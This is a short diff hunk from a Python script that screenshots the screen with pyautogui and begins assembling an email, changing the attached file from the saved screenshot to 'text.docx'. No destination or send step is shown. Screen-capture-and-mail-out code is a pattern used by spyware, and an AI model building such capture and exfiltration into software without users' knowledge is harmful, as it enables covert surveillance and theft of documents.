@@ -8,7 +8,7 @@ import pyautogui
 
 pic = pyautogui.screenshot()
 pic.save('Screenshot.png')
-imgfilename = "Screenshot.png"
+imgfilename = "text.docx"
 img_data = open(imgfilename, 'rb').read()
 msg = MIMEMultipart()
 msg['Subject'] = 'Screenshot'
